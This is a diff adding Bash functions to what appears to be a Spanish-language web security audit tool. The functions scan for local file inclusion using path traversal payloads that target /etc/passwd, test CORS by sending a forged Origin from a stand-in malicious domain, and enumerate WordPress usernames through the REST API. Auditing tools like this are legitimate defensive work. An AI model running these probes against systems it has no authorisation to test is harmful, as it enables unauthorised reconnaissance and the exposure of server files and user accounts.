@@ -149,3 +149,94 @@ function http_verbs_scanner() {
     echo ""
     read -p "Presiona Enter..."
 }
+
+function lfi_scanner() {
+    echo -e "\n${CYAN}--- Escáner de Inclusión de Archivos Locales (LFI) ---${NC}"
+    echo -e "${YELLOW}Auditoría: Intenta leer archivos críticos del servidor (ej. /etc/passwd).${NC}"
+    read -p "URL con parámetro (ej. http://sitio.com/page.php?file=): " lfi_url
+    [[ -z "$lfi_url" ]] && return
+    
+    local payloads=("../../../../etc/passwd" "..%2f..%2f..%2f..%2fetc%2fpasswd")
+    
+    if command -v curl >/dev/null 2>&1; then
+        for payload in "${payloads[@]}"; do
+            echo -e "\n${YELLOW}[*] Inyectando: $payload${NC}"
+            local response=$(curl -sL "${lfi_url}${payload}")
+            
+            if echo "$response" | grep -q "root:x:0:0:"; then
+                echo -e "${RED}[!] ¡ALERTA CRÍTICA! LFI Confirmado. Archivo passwd expuesto.${NC}"
+                log_event "[Web] RIESGO CRÍTICO: LFI detectado en $lfi_url con payload $payload"
+                break
+            else
+                echo -e "${GREEN}[+] El payload no devolvió el archivo sensible.${NC}"
+            fi
+        done
+    fi
+    echo ""
+    read -p "Presiona Enter..."
+}
+
+function cors_misconfig() {
+    echo -e "\n${CYAN}--- Auditor de Configuraciones CORS ---${NC}"
+    echo -e "${YELLOW}Valida si un endpoint web acepta peticiones cruzadas indiscriminadas.${NC}"
+    read -p "Endpoint objetivo (ej. https://api.sitio.com/data): " cors_url
+    [[ -z "$cors_url" ]] && return
+    
+    local evil_origin="https://evil-malicious-domain.com"
+    echo -e "\n${GREEN}[+] Enviando cabecera inyectada: Origin: $evil_origin${NC}"
+    
+    if command -v curl >/dev/null 2>&1; then
+        local response=$(curl -s -I -H "Origin: $evil_origin" "$cors_url")
+        
+        if echo "$response" | grep -i "Access-Control-Allow-Origin: $evil_origin" >/dev/null; then
+             echo -e "${RED}[!] VULNERABLE: El endpoint refleja Origins arbitrarios.${NC}"
+             echo -e "${RED}    CORS Misconfiguration detectado. Riesgo de robo de datos cross-site.${NC}"
+             log_event "[Web] VULNERABILIDAD: CORS Misconfiguration en $cors_url"
+        elif echo "$response" | grep -i "Access-Control-Allow-Origin: \*" >/dev/null; then
+             echo -e "${YELLOW}[!] PRECAUCIÓN: El endpoint permite Origin: *. Seguro si es API pública, riesgoso si requiere credenciales.${NC}"
+             log_event "[Web] Advertencia: Origin '*' presente en $cors_url"
+        else
+             echo -e "${GREEN}[+] SEGURO: El servidor no refleja Origins malignos.${NC}"
+        fi
+    fi
+    echo ""
+    read -p "Presiona Enter..."
+}
+
+function wordpress_enum() {
+    echo -e "\n${CYAN}--- Detector Rápido de WordPress (CMS) ---${NC}"
+    echo -e "${YELLOW}Chequea exposición de REST API y rutas default típicas de instancias WP.${NC}"
+    read -p "URL raíz objetivo (ej. https://blog.sitio.com): " wp_url
+    [[ -z "$wp_url" ]] && return
+
+    echo -e "\n${GREEN}[+] Comprobando enrutadores de WP comunes...${NC}"
+    if command -v curl >/dev/null 2>&1; then
+        local rest_api=$(curl -s -o /dev/null -w "%{http_code}" "${wp_url}/wp-json/wp/v2/users")
+        local login_path=$(curl -s -o /dev/null -w "%{http_code}" "${wp_url}/wp-login.php")
+        
+        local is_wp=false
+        if [[ "$login_path" == "200" || "$login_path" == "301" ]]; then
+            echo -e "${LIGHT_GREEN}[+] Portal wp-login expuesto: ${wp_url}/wp-login.php${NC}"
+            is_wp=true
+        fi
+        
+        if [[ "$rest_api" == "200" ]]; then
+             echo -e "${RED}[!] REST API EXPUESTA. Riesgo de enumeración pasiva de usuarios.${NC}"
+             log_event "[Web] Enumeración de usuarios de WordPress permitida: ${wp_url}/wp-json/wp/v2/users"
+             is_wp=true
+             
+             # Fetch 3 users
+             local users=$(curl -s "${wp_url}/wp-json/wp/v2/users" | grep -oP '"slug":"[^"]*"' | head -n 3 | cut -d'"' -f4)
+             if [[ -n "$users" ]]; then
+                 echo -e "${CYAN}Usuarios extraídos remotamente:${NC}"
+                 echo "$users" | sed 's/^/  - /'
+             fi
+        fi
+        
+        if [[ "$is_wp" == "false" ]]; then
+            echo -e "${YELLOW}[*] No se detectaron firmas directas de WordPress.${NC}"
+        fi
+    fi
+    echo ""
+    read -p "Presiona Enter..."
+}
